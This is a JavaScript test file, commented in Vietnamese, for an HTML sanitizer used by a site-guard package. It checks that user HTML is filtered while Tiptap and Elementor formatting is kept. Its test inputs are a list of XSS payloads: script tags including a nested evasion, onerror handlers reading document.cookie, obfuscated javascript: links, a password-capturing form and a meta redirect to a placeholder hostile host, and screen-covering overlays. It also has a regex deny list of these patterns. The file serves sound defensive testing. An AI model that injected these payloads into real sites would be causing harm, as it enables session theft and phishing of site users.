// Bài kiểm cho `src/core/loc-html.js` — BẢN CHUẨN lọc HTML người nhập của nhà.
//
// Bài này canh 3 thứ, mất cái nào là ĐỎ:
//   ① `locHtml` cắt đúng phần nguy hiểm (mỗi mẩu dưới đây từng là một đường chạy mã thật);
//   ② GIỮ ĐỦ định dạng thật — cắt nhầm là **mất chữ của khách**, hỏng câm không ai báo;
//   ③ cửa xuất `@suga/site-guard/loc-html` còn khai trong `package.json` — mất khai là mọi site
//      bên ngoài gãy ngay lúc nạp, mà bài kiểm nội bộ (nạp theo đường tương đối) vẫn xanh;
//   ④ chế độ THÂN BÀI (`baiViet`) nới đủ để không mất ảnh, mà không nới thành cửa sau.
const assert = require('assert');
const path = require('path');
const { locHtml, locHtmlBaiViet, hrefAnToan } = require('../src/core/loc-html.js');

let so = 0;
const ok = (ten) => { so++; console.log('  ✓', ten); };

// ── ① CẮT: mỗi mẩu dưới đây từng là một đường chạy mã trong phiên của Chủ ─────────────────────
const DON = [
  ['thẻ script thẳng', '<script>alert(1)</script>'],
  ['script viết hoa/lẫn lộn', '<ScRiPt>alert(1)</sCrIpT>'],
  ['script lồng để né bộ cắt', '<scr<script>ipt>alert(1)</script>'],
  ['script không đóng thẻ', '<script>alert(1)'],
  ['ảnh hỏng gọi onerror', '<img src=x onerror=alert(1)>'],
  ['onerror không dấu nháy', '<img src=x onerror=alert(document.cookie)>'],
  ['svg onload', '<svg onload=alert(1)></svg>'],
  ['thẻ body onload', '<body onload=alert(1)>'],
  ['link javascript:', '<a href="javascript:alert(1)">bấm</a>'],
  ['javascript: có TAB chèn giữa', '<a href="java\tscript:alert(1)">bấm</a>'],
  ['javascript: mã hoá thực thể', '<a href="java&#115;cript:alert(1)">bấm</a>'],
  ['javascript: viết hoa + khoảng trắng', '<a href="  JAVA SCRIPT:alert(1)">bấm</a>'],
  ['iframe nhét vào', '<iframe src="//ke-la.example/x"></iframe>'],
  ['iframe srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ['form giả nuốt mật khẩu', '<form action="//ke-la.example"><input name="password"></form>'],
  ['thẻ style đè giao diện', '<style>body{display:none}</style>'],
  ['style phủ kín màn đè nút Lưu', '<div style="position:fixed;inset:0;z-index:9999">x</div>'],
  ['đè id của trang admin (phá DOM)', '<div id="editform">x</div>'],
  ['object/embed', '<object data="x"></object><embed src="x">'],
  ['thẻ meta chuyển hướng', '<meta http-equiv="refresh" content="0;url=//ke-la.example">'],
];
const CAM = /<script|<iframe|<svg|<object|<embed|<form|<style|<meta|<img|on(error|load|click|mouseover)\s*=|javascript\s*:|srcdoc|position\s*:\s*fixed|id\s*=/i;
for (const [ten, doc] of DON) {
  const ra = locHtml(doc);
  assert.ok(!CAM.test(ra), `❌ CÒN SÓT ở "${ten}": ${JSON.stringify(ra)}`);
  ok(`cắt sạch — ${ten}`);
}

// ── ② GIỮ: cắt nhầm là MẤT CHỮ. Đây đúng là thứ trình soạn Tiptap đẻ ra ───────────────────────
const GIU = [
  ['chữ tiếng Việt có dấu', '<p>Nha khoa <strong>Hi</strong>Dental — chăm sóc răng miệng</p>'],
  ['đậm/nghiêng/gạch chân', '<p><strong>đậm</strong><em>nghiêng</em><u>gạch chân</u></p>'],
  ['đầu dòng chấm', '<ul><li>một</li><li>hai</li></ul>'],
  ['đầu dòng số', '<ol><li>một</li><li>hai</li></ol>'],
  ['căn lề (TextAlign)', '<p style="text-align: center">giữa</p>'],
  ['link tương đối', '<a href="/lien-he">Liên hệ</a>'],
  ['link ngoài', '<a href="https://suga.vn">Suga</a>'],
  ['link thư/điện thoại', '<a href="mailto:a@b.vn">thư</a><a href="tel:0900">gọi</a>'],
  ['xuống dòng', 'dòng một<br>dòng hai'],
];
for (const [ten, doc] of GIU) {
  const ra = locHtml(doc);
  const chu = (s) => s.replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim();
  assert.strictEqual(chu(ra), chu(doc), `❌ MẤT CHỮ ở "${ten}": ${JSON.stringify(ra)}`);
  ok(`giữ nguyên — ${ten}`);
}
assert.ok(/<strong>/.test(locHtml('<p><strong>x</strong></p>')), '❌ mất thẻ đậm');
assert.ok(/text-align: center/.test(locHtml('<p style="text-align: center">x</p>')), '❌ mất căn lề');
assert.ok(/href="\/lien-he"/.test(locHtml('<a href="/lien-he">x</a>')), '❌ mất link tương đối');
assert.ok(/rel="noopener noreferrer"/.test(locHtml('<a href="https://x.vn" target="_blank">x</a>')),
  '❌ mở tab mới mà thiếu noopener');
ok('định dạng + link còn đủ, mở tab mới có noopener');

// dấu `&` trong chữ KHÔNG được mã hoá hai lần (hỏng câm: màn hiện ra chữ "&amp;")
assert.ok(!/&amp;amp;/.test(locHtml('<p>Suga &amp; Group</p>')), '❌ mã hoá 2 lần dấu &');
// thẻ mở bỏ ngỏ phải được đóng lại, kẻo bôi đậm cả trang admin
assert.ok(/<\/b>/.test(locHtml('<b>quên đóng')), '❌ thẻ bỏ ngỏ không được đóng');
ok('không mã hoá 2 lần · tự đóng thẻ bỏ ngỏ');

assert.strictEqual(hrefAnToan('data:text/html,<script>alert(1)</script>'), false, '❌ lọt data:');
assert.strictEqual(hrefAnToan('vbscript:msgbox(1)'), false, '❌ lọt vbscript:');
assert.strictEqual(hrefAnToan('#phan-1'), true, '❌ chặn nhầm neo #');
ok('lược đồ link: chặn data:/vbscript:, cho qua neo #');

// ── ③ CỬA XUẤT: site ngoài nạp bằng `@suga/site-guard/loc-html`, KHÔNG bằng đường tương đối ───
// Bài kiểm ở trên nạp `../src/core/loc-html.js` nên **vẫn xanh dù ai đó xoá khai báo cửa xuất** —
// mà xoá là mọi site bên ngoài gãy ngay lúc `require`. Vì vậy phải canh riêng khai báo, và canh cả
// `files:` (không có `src` thì gói xuất ra thiếu tệp, chỉ vỡ khi cài từ xa — muộn nhất có thể).
const pkg = require('../package.json');
assert.strictEqual(pkg.exports['./loc-html'], './src/core/loc-html.js',
  '❌ MẤT khai báo cửa xuất `./loc-html` — site ngoài sẽ gãy lúc nạp, bài kiểm nội bộ KHÔNG thấy');
assert.ok((pkg.files || []).includes('src'), '❌ `files:` thiếu `src` — gói xuất ra sẽ không có tệp lọc');
ok('cửa xuất `@suga/site-guard/loc-html` còn khai + `files:` có `src`');

// Nạp đúng như site ngoài nạp — bắt lỗi cú pháp/đường dẫn mà đường tương đối che mất.
const quaCua = require(path.join(__dirname, '..', pkg.exports['./loc-html']));
assert.strictEqual(typeof quaCua.locHtml, 'function', '❌ cửa xuất không trả về hàm `locHtml`');
assert.strictEqual(typeof quaCua.hrefAnToan, 'function', '❌ cửa xuất không trả về hàm `hrefAnToan`');
assert.strictEqual(quaCua.locHtml('<img src=x onerror=alert(1)>b'), 'b',
  '❌ hàm lấy qua cửa xuất KHÔNG lọc — hai đường nạp đang trỏ hai tệp khác nhau');
ok('nạp qua cửa xuất ra đúng hàm, và hàm đó lọc thật');

// ── ④ CHẾ ĐỘ THÂN BÀI (`baiViet`) — nới ĐỦ để không mất ảnh, KHÔNG nới thành cửa sau ──────────
// 🩸 Vì sao có chế độ này: đo bài thật trên `nhonho.vn` 05/08/2026 — thân bài là markup Elementor
// di trú, một bài `img` x18 + `div` x58. Lọc bằng bản HẸP là bài viết trắng trơn. Cắt nhầm cũng là
// hỏng, ngang chỗ thủng — nên phải canh CẢ HAI VẾ ở đây.
assert.strictEqual(locHtml('<div class="elementor-element"><img src="/a.jpg" alt="chai">chữ</div>'), 'chữ',
  '❌ bản HẸP hết hẹp — `div`/`img` KHÔNG được lọt vào chế độ mặc định');
ok('bản hẹp vẫn hẹp: div/img bị bỏ khi không bật baiViet');

const BAI = '<div class="elementor-element elementor-element-0c58836 elementor-widget" data-id="0c58836">'
  + '<img src="https://kho.example/anh.jpg" alt="Chai vang" title="Vang" loading="lazy" decoding="async" width="800" height="600">'
  + '<p>Chữ trong bài</p></div>';
const raBai = locHtmlBaiViet(BAI);
assert.ok(/<img [^>]*src="https:\/\/kho\.example\/anh\.jpg"/.test(raBai), `❌ MẤT ẢNH trong thân bài: ${raBai}`);
assert.ok(/alt="Chai vang"/.test(raBai) && /loading="lazy"/.test(raBai), '❌ mất alt/loading của ảnh');
assert.ok(/<div class="elementor-element elementor-element-0c58836 elementor-widget"/.test(raBai),
  `❌ mất khung/lớp Elementor — bài sẽ vỡ giao diện: ${raBai}`);
assert.ok(!/data-id/.test(raBai), '❌ còn `data-*` — móc chạy của Elementor, site mới không dùng');
assert.ok(/Chữ trong bài/.test(raBai), '❌ mất chữ trong thân bài');
ok('thân bài: giữ ảnh + khung + lớp Elementor, bỏ data-*');

for (const [ten, doc] of [
  ['script trong thân bài', '<div><script>alert(1)</script>chào</div>'],
  ['ảnh gọi onerror', '<div><img src=x onerror=alert(1)></div>'],
  ['ảnh src javascript:', '<div><img src="javascript:alert(1)"></div>'],
  ['ảnh src data:text/html', '<div><img src="data:text/html,<b>x</b>"></div>'],
  ['iframe trong thân bài', '<div><iframe src="//ke-la.example"></iframe>chào</div>'],
  ['bảng có onclick', '<table onclick="alert(1)"><tr><td>ô</td></tr></table>'],
  ['thẻ nền ẩn đè màn', '<div style="position:fixed;inset:0;z-index:9999">x</div>'],
]) {
  const ra = locHtmlBaiViet(doc);
  assert.ok(!/<script|<iframe|on(error|load|click)\s*=|javascript\s*:|data:text\/html|position\s*:\s*fixed/i.test(ra),
    `❌ chế độ baiViet CÒN SÓT "${ten}": ${JSON.stringify(ra)}`);
  ok(`thân bài vẫn cắt — ${ten}`);
}

// Lớp CSS: giữ theo HỌ TÊN. Kẻ ghi được vào kho mà mượn được lớp tiện ích của site (Tailwind
// `fixed inset-0 z-50`) là dựng được tấm phủ kín màn đè lên nút thật — không cần chạy mã nào.
const raLop = locHtmlBaiViet('<div class="elementor-element fixed inset-0 z-50 bg-white">x</div>');
assert.ok(/class="elementor-element"/.test(raLop), `❌ lọc lớp quá tay, mất cả lớp lành: ${raLop}`);
assert.ok(!/fixed|inset-0|z-50/.test(raLop), `❌ lọt lớp tiện ích của site — dựng được tấm phủ: ${raLop}`);
ok('lớp CSS: giữ họ WordPress/Elementor, chặn lớp tiện ích mượn của site');

assert.strictEqual(typeof quaCua.locHtmlBaiViet, 'function', '❌ cửa xuất thiếu `locHtmlBaiViet`');
ok('cửa xuất có cả `locHtmlBaiViet`');

console.log(`\n✅ loc-html: ${so} phép kiểm — PASS`);
